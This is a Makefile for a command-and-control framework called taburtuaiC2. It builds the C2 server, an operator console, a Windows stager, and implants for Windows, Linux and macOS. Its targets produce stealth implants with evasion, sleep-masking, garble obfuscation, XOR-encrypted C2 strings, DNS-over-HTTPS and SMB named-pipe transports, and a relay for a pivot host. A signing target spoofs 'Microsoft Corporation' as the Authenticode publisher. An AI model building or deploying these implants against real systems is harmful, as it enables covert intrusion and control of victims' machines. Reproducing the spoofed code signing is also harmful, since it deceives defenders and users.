# taburtuaiC2 Makefile
# Usage: make help

BINARY_DIR   := bin
SERVER_BIN   := $(BINARY_DIR)/server
OPERATOR_BIN := $(BINARY_DIR)/operator
GENERATE_BIN := $(BINARY_DIR)/generate
STRENC_BIN   := $(BINARY_DIR)/strenc
AGENT_DIR    := ./agent

# Default C2 server (override via env or CLI)
C2_SERVER   ?= http://127.0.0.1:8080
ENC_KEY     ?= SpookyOrcaC2AES1
SEC_KEY     ?= TaburtuaiSecondary
INTERVAL    ?= 30
JITTER      ?= 20
KILL_DATE    ?=
PROFILE      ?= default
FRONT_DOMAIN ?=

# XOR_KEY: single byte as 2-digit hex (00–ff). Default: 5a
XOR_KEY     ?= 5a

# Alternative transport selection
# TRANSPORT: http (default) | doh | icmp | smb
TRANSPORT   ?= http
DOH_DOMAIN  ?=
DOH_PROVIDER ?= cloudflare
SMB_RELAY   ?=
SMB_PIPE    ?= svcctl

# Build tools
GO          := go
GARBLE      := garble

LDFLAGS_BASE := -X main.serverURL=$(C2_SERVER) \
                -X main.encKey=$(ENC_KEY) \
                -X main.secondaryKey=$(SEC_KEY) \
                -X main.defaultInterval=$(INTERVAL) \
                -X main.defaultJitter=$(JITTER) \
                -X main.defaultProfile=$(PROFILE) \
                -X main.defaultFrontDomain=$(FRONT_DOMAIN) \
                -X main.defaultTransport=$(TRANSPORT) \
                -X main.defaultDOHDomain=$(DOH_DOMAIN) \
                -X main.defaultDOHProvider=$(DOH_PROVIDER) \
                -X main.defaultSMBRelay=$(SMB_RELAY) \
                -X main.defaultSMBPipe=$(SMB_PIPE)

LDFLAGS_STRIP := $(LDFLAGS_BASE) -s -w
LDFLAGS_WIN   := $(LDFLAGS_STRIP) -H windowsgui

# ANSI colour codes (work in bash; noop on non-colour terminals)
C0  := \033[0m
CB  := \033[1m
CD  := \033[2m
CR  := \033[31m
CG  := \033[32m
CY  := \033[33m
CC  := \033[36m
CW  := \033[97m
SEP := $(CD)━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━$(C0)

# ── Shared shell snippets ─────────────────────────────────────────────────────
# Print file stats after a successful build.  Usage: $(call BUILD_STAT,path)
define BUILD_STAT
	@{ \
	  t=$(1); \
	  sz=$$(wc -c < $$t | tr -d ' '); \
	  mb=$$(awk "BEGIN{printf \"%.2f\", $$sz/1048576}"); \
	  h=$$(sha256sum $$t 2>/dev/null | cut -c1-16 || shasum -a256 $$t | cut -c1-16); \
	  printf "\n  $(SEP)\n"; \
	  printf "  $(CG)$(CB)[+]$(C0) $(CB)%s$(C0)\n" "$$t"; \
	  printf "      $(CD)%-8s$(C0) %s MB\n" "size" "$$mb"; \
	  printf "      $(CD)%-8s$(C0) %s…\n"   "sha256" "$$h"; \
	  printf "  $(SEP)\n\n"; \
	}
endef

.PHONY: all server operator generate strenc agent-windows agent-linux agent-darwin \
        agent-win-stealth agent-win-garble agent-win-encrypted agent-win-doh agent-win-smb \
        stager smb-relay deps clean help sign sign-cert build-check

## ── Default ──────────────────────────────────────────────────────────────────

all: server operator generate agent-windows

## ── Server & Operator ────────────────────────────────────────────────────────

server: ## Build C2 server binary
	@mkdir -p $(BINARY_DIR)
	@printf "  $(CD)[*]$(C0) building server …\n"
	@$(GO) build -o $(SERVER_BIN) ./cmd/server
	@printf "  $(CG)$(CB)[+]$(C0) $(CB)$(SERVER_BIN)$(C0)\n\n"

operator: ## Build operator CLI binary
	@mkdir -p $(BINARY_DIR)
	@printf "  $(CD)[*]$(C0) building operator …\n"
	@$(GO) build -o $(OPERATOR_BIN) ./cmd/operator
	@printf "  $(CG)$(CB)[+]$(C0) $(CB)$(OPERATOR_BIN)$(C0)\n\n"

generate: ## Build implant generator CLI
	@mkdir -p $(BINARY_DIR)
	@printf "  $(CD)[*]$(C0) building generator …\n"
	@$(GO) build -o $(GENERATE_BIN) ./cmd/generate
	@printf "  $(CG)$(CB)[+]$(C0) $(CB)$(GENERATE_BIN)$(C0)\n\n"

strenc: ## Build string encryption helper
	@mkdir -p $(BINARY_DIR)
	@$(GO) build -o $(STRENC_BIN) ./cmd/strenc

stager: ## Build Windows stager binary
	@mkdir -p $(BINARY_DIR)
	@printf "  $(CD)[*]$(C0) building stager …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.c2URL=$(C2_SERVER) \
			-X main.stageToken=$(STAGE_TOKEN) \
			-X main.encKey=$(ENC_KEY) \
			-X main.execMethod=$(or $(EXEC_METHOD),thread)" \
		-o $(BINARY_DIR)/stager.exe \
		./cmd/stager
	$(call BUILD_STAT,$(BINARY_DIR)/stager.exe)

## ── Agent builds ─────────────────────────────────────────────────────────────

agent-windows: ## Build Windows agent (with console, for testing/dev)
	@mkdir -p $(BINARY_DIR)
	@printf "\n  $(SEP)\n"
	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
	@printf "  $(SEP)\n\n"
	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  (dev build, console visible)"
	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)"
	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
	@printf "    $(CD)%-12s$(C0) %s\n" "exec"     "cmd"
	@printf "\n  $(CD)[*]$(C0) compiling …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_BASE) -X main.defaultExecMethod=cmd" \
		-o $(BINARY_DIR)/agent_windows.exe \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows.exe)

agent-win-stealth: ## Build Windows stealth agent (no console, stripped, evasion on)
	@mkdir -p $(BINARY_DIR)
	@printf "\n  $(SEP)\n"
	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
	@printf "  $(SEP)\n\n"
	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  ·  stealth  (no-console, stripped)"
	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)"
	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"  "on  ·  sleep-masking on"
	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
	@printf "    $(CD)%-12s$(C0) %s\n" "exec"     "powershell"
	@printf "\n  $(CD)[*]$(C0) compiling …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true \
			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
		-o $(BINARY_DIR)/agent_windows_stealth.exe \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_stealth.exe)

agent-win-garble: ## Build Windows agent with garble obfuscation
	@command -v $(GARBLE) >/dev/null 2>&1 || { \
	  printf "  $(CR)[!]$(C0) garble not found: go install mvdan.cc/garble@latest\n"; exit 1; }
	@mkdir -p $(BINARY_DIR)
	@printf "\n  $(SEP)\n"
	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
	@printf "  $(SEP)\n\n"
	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  ·  garble-obfuscated"
	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)"
	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"  "on  ·  sleep-masking on"
	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
	@printf "    $(CD)%-12s$(C0) %s\n" "obfuscation" "garble -tiny -literals -seed=random"
	@printf "\n  $(CD)[*]$(C0) compiling + obfuscating …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GARBLE) -tiny -literals -seed=random build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true" \
		-o $(BINARY_DIR)/agent_windows_obf.exe \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_obf.exe)

agent-win-encrypted: strenc ## Build Windows stealth agent with XOR-encrypted build strings
	$(eval ENC_SERVER := $(shell $(STRENC_BIN) enc "$(C2_SERVER)" $(XOR_KEY)))
	$(eval ENC_ENCKEY := $(shell $(STRENC_BIN) enc "$(ENC_KEY)" $(XOR_KEY)))
	$(eval ENC_SECKEY := $(shell $(STRENC_BIN) enc "$(SEC_KEY)" $(XOR_KEY)))
	@mkdir -p $(BINARY_DIR)
	@printf "\n  $(SEP)\n"
	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
	@printf "  $(SEP)\n\n"
	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  ·  XOR-encrypted strings"
	@printf "    $(CD)%-12s$(C0) %s  $(CD)(encrypted in binary)$(C0)\n" "server" "$(C2_SERVER)"
	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"  "on  ·  sleep-masking on"
	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
	@printf "    $(CD)%-12s$(C0) 0x%s\n" "xor key"  "$(XOR_KEY)"
	@printf "\n  $(CD)[*]$(C0) compiling …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "-s -w -H windowsgui \
			-X main.serverURLEnc=$(ENC_SERVER) \
			-X main.encKeyEnc=$(ENC_ENCKEY) \
			-X main.secKeyEnc=$(ENC_SECKEY) \
			-X main.xorKeyHex=$(XOR_KEY) \
			-X main.defaultInterval=$(INTERVAL) \
			-X main.defaultJitter=$(JITTER) \
			-X main.defaultProfile=$(PROFILE) \
			-X main.defaultFrontDomain=$(FRONT_DOMAIN) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true \
			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
		-o $(BINARY_DIR)/agent_windows_enc.exe \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_enc.exe)

agent-win-doh: ## Build Windows agent using DNS-over-HTTPS transport
	@test -n "$(DOH_DOMAIN)" || { \
	  printf "  $(CR)[!]$(C0) DOH_DOMAIN required.  example: make agent-win-doh DOH_DOMAIN=c2.example.com\n"; exit 1; }
	@mkdir -p $(BINARY_DIR)
	@printf "\n  $(SEP)\n"
	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
	@printf "  $(SEP)\n\n"
	@printf "    $(CD)%-12s$(C0) %s\n" "target"    "Windows x64  ·  DNS-over-HTTPS transport"
	@printf "    $(CD)%-12s$(C0) %s\n" "doh domain" "$(DOH_DOMAIN)"
	@printf "    $(CD)%-12s$(C0) %s\n" "provider"  "$(DOH_PROVIDER)"
	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"   "on  ·  sleep-masking on"
	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
	@printf "\n  $(CD)[*]$(C0) compiling …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.defaultTransport=doh \
			-X main.defaultDOHDomain=$(DOH_DOMAIN) \
			-X main.defaultDOHProvider=$(DOH_PROVIDER) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true \
			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
		-o $(BINARY_DIR)/agent_windows_doh.exe \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_doh.exe)

agent-win-smb: ## Build Windows agent using SMB named pipe transport
	@test -n "$(SMB_RELAY)" || { \
	  printf "  $(CR)[!]$(C0) SMB_RELAY required.  example: make agent-win-smb SMB_RELAY=FILESERVER01\n"; exit 1; }
	@mkdir -p $(BINARY_DIR)
	@printf "\n  $(SEP)\n"
	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
	@printf "  $(SEP)\n\n"
	@printf "    $(CD)%-12s$(C0) %s\n" "target"  "Windows x64  ·  SMB named-pipe transport"
	@printf "    $(CD)%-12s$(C0) \\\\%s\\pipe\\%s\n" "relay"   "$(SMB_RELAY)" "$(SMB_PIPE)"
	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
	@printf "    $(CD)%-12s$(C0) %s\n" "evasion" "on  ·  sleep-masking on"
	@[ -n "$(KILL_DATE)" ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date" "$(KILL_DATE)" || true
	@printf "\n  $(CD)[*]$(C0) compiling …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.defaultTransport=smb \
			-X main.defaultSMBRelay=$(SMB_RELAY) \
			-X main.defaultSMBPipe=$(SMB_PIPE) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true \
			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),)" \
		-o $(BINARY_DIR)/agent_windows_smb.exe \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_windows_smb.exe)

smb-relay: ## Build SMB named pipe relay (deploy on internal pivot host)
	@mkdir -p $(BINARY_DIR)
	@printf "  $(CD)[*]$(C0) building SMB relay …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "-s -w" \
		-o $(BINARY_DIR)/smb_relay.exe \
		./cmd/listener/smb_relay.go
	$(call BUILD_STAT,$(BINARY_DIR)/smb_relay.exe)

# Usage:
#   make agent-custom \
#     C2_SERVER=http://192.168.1.10:8080 \
#     ENC_KEY=MyKey12345678901 \
#     INTERVAL=60 JITTER=30 \
#     KILL_DATE=2026-12-31
agent-custom: ## Build Windows agent with fully custom parameters
	@mkdir -p $(BINARY_DIR)
	@printf "\n  $(SEP)\n"
	@printf "  $(CB)$(CC) TABURTUAI C2$(C0)  $(CD)·$(C0)  implant compiler\n"
	@printf "  $(SEP)\n\n"
	@printf "    $(CD)%-12s$(C0) %s\n" "target"   "Windows x64  ·  custom"
	@printf "    $(CD)%-12s$(C0) %s\n" "server"   "$(C2_SERVER)"
	@printf "    $(CD)%-12s$(C0) %ss  ±%s%% jitter\n" "interval" "$(INTERVAL)" "$(JITTER)"
	@printf "    $(CD)%-12s$(C0) %s\n" "evasion"  "on  ·  sleep-masking on"
	@[ -n "$(KILL_DATE)"   ] && printf "    $(CD)%-12s$(C0) %s\n" "kill date"  "$(KILL_DATE)"  || true
	@[ -n "$(WORK_START)"  ] && printf "    $(CD)%-12s$(C0) %s – %s\n" "work hours" "$(WORK_START):00" "$(WORK_END):00" || true
	@printf "\n  $(CD)[*]$(C0) compiling …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_WIN) \
			-X main.defaultExecMethod=powershell \
			-X main.defaultEnableEvasion=true \
			-X main.defaultSleepMasking=true \
			$(if $(KILL_DATE),-X main.defaultKillDate=$(KILL_DATE),) \
			$(if $(WORK_START),-X main.defaultWorkingHoursOnly=true,) \
			$(if $(WORK_START),-X main.defaultWorkingHoursStart=$(WORK_START),) \
			$(if $(WORK_END),-X main.defaultWorkingHoursEnd=$(WORK_END),)" \
		-o $(BINARY_DIR)/agent_custom.exe \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_custom.exe)

agent-linux: ## Build Linux agent
	@mkdir -p $(BINARY_DIR)
	@printf "  $(CD)[*]$(C0) building Linux agent …\n"
	@GOOS=linux GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_STRIP)" \
		-o $(BINARY_DIR)/agent_linux \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_linux)

agent-darwin: ## Build macOS agent
	@mkdir -p $(BINARY_DIR)
	@printf "  $(CD)[*]$(C0) building macOS agent …\n"
	@GOOS=darwin GOARCH=amd64 CGO_ENABLED=0 \
	$(GO) build \
		-ldflags "$(LDFLAGS_STRIP)" \
		-o $(BINARY_DIR)/agent_darwin \
		$(AGENT_DIR)
	$(call BUILD_STAT,$(BINARY_DIR)/agent_darwin)

## ── Signing ──────────────────────────────────────────────────────────────────

SIGN_BINARY    ?=
SIGN_PUBLISHER ?= Microsoft Corporation
SIGN_CERT      ?=
SIGN_PASS      ?= taburtuai

sign: ## Sign a Windows PE binary with a self-signed Authenticode cert
	@test -n "$(SIGN_BINARY)" || { \
	  printf "  $(CR)[!]$(C0) Usage: make sign BINARY=path/to/agent.exe\n"; exit 1; }
	@printf "  $(CD)[*]$(C0) signing $(SIGN_BINARY) …\n"
	@mkdir -p $(BINARY_DIR)
	@$(GO) run ./cmd/sign \
		--binary "$(SIGN_BINARY)" \
		$(if $(SIGN_CERT),--cert "$(SIGN_CERT)",) \
		--password "$(SIGN_PASS)" \
		--publisher "$(SIGN_PUBLISHER)"
	@printf "  $(CG)$(CB)[+]$(C0) signed: $(SIGN_BINARY)\n\n"

sign-cert: ## Generate a self-signed PFX cert only
	@$(GO) run ./cmd/sign \
		--gen-cert \
		--publisher "$(SIGN_PUBLISHER)" \
		--password "$(SIGN_PASS)" \
		--out $(BINARY_DIR)/sign.pfx
	@printf "  $(CG)$(CB)[+]$(C0) $(BINARY_DIR)/sign.pfx  $(CD)(password: $(SIGN_PASS))$(C0)\n\n"

## ── Utilities ────────────────────────────────────────────────────────────────

deps: ## Download and tidy Go modules
	@printf "  $(CD)[*]$(C0) tidying modules …\n"
	@$(GO) mod download
	@$(GO) mod tidy
	@printf "  $(CG)$(CB)[+]$(C0) dependencies ready\n\n"

build-check: ## Verify all packages compile (Windows + native)
	@printf "  $(CD)[*]$(C0) native build check …\n"
	@$(GO) build ./...
	@printf "  $(CD)[*]$(C0) windows/amd64 cross-compile check …\n"
	@GOOS=windows GOARCH=amd64 CGO_ENABLED=0 $(GO) build ./...
	@printf "  $(CG)$(CB)[+]$(C0) all packages OK\n\n"

clean: ## Remove build artifacts
	@rm -rf $(BINARY_DIR)
	@printf "  $(CG)$(CB)[+]$(C0) cleaned\n\n"

run-server: server ## Build and run server
	./$(SERVER_BIN)

run-operator: operator ## Build and run operator console
	./$(OPERATOR_BIN) console --server $(C2_SERVER)

help: ## Show this help
	@printf "\n  $(CB)$(CC)TABURTUAI C2$(C0)  $(CD)—$(C0)  build system\n\n"
	@grep -E '^[a-zA-Z_-]+:.*?## .*$$' $(MAKEFILE_LIST) | \
		awk 'BEGIN {FS = ":.*?## "}; {printf "  \033[36m%-22s\033[0m %s\n", $$1, $$2}'
	@printf "\n  $(CD)Variables$(C0)  (pass via make VAR=value):\n\n"
	@printf "  $(CY)%-16s$(C0) %s\n" "C2_SERVER"    "C2 URL                   (default: http://127.0.0.1:8080)"
	@printf "  $(CY)%-16s$(C0) %s\n" "ENC_KEY"      "AES encryption key       (default: SpookyOrcaC2AES1)"
	@printf "  $(CY)%-16s$(C0) %s\n" "INTERVAL"     "Beacon interval seconds  (default: 30)"
	@printf "  $(CY)%-16s$(C0) %s\n" "JITTER"       "Jitter percent           (default: 20)"
	@printf "  $(CY)%-16s$(C0) %s\n" "KILL_DATE"    "Kill date YYYY-MM-DD     (empty = never)"
	@printf "  $(CY)%-16s$(C0) %s\n" "WORK_START"   "Working hours start 0-23"
	@printf "  $(CY)%-16s$(C0) %s\n" "WORK_END"     "Working hours end   0-23"
	@printf "  $(CY)%-16s$(C0) %s\n" "XOR_KEY"      "XOR byte hex  (default: 5a)  for agent-win-encrypted"
	@printf "  $(CY)%-16s$(C0) %s\n" "DOH_DOMAIN"   "C2 DNS zone  (required for agent-win-doh)"
	@printf "  $(CY)%-16s$(C0) %s\n" "DOH_PROVIDER" "cloudflare|google        (default: cloudflare)"
	@printf "  $(CY)%-16s$(C0) %s\n" "SMB_RELAY"    "Relay host name/IP       (required for agent-win-smb)"
	@printf "  $(CY)%-16s$(C0) %s\n" "SMB_PIPE"     "Named pipe on relay      (default: svcctl)"
	@printf "\n  $(CD)Examples$(C0):\n\n"
	@printf "  $(CD)make agent-win-stealth C2_SERVER=https://c2.corp.local:8000 ENC_KEY=K3y123 KILL_DATE=2026-12-31$(C0)\n"
	@printf "  $(CD)make agent-custom      C2_SERVER=https://c2.corp.local:8000 INTERVAL=300 JITTER=40 WORK_START=8 WORK_END=18$(C0)\n"
	@printf "  $(CD)make agent-win-encrypted C2_SERVER=https://c2.corp.local ENC_KEY=K3y123 XOR_KEY=a3$(C0)\n"
	@printf "  $(CD)make agent-win-doh     DOH_DOMAIN=c2.example.com ENC_KEY=K3y123$(C0)\n"
	@printf "  $(CD)make agent-win-smb     SMB_RELAY=FILESERVER01 SMB_PIPE=svcctl C2_SERVER=https://c2.corp.local$(C0)\n"
	@printf "\n"
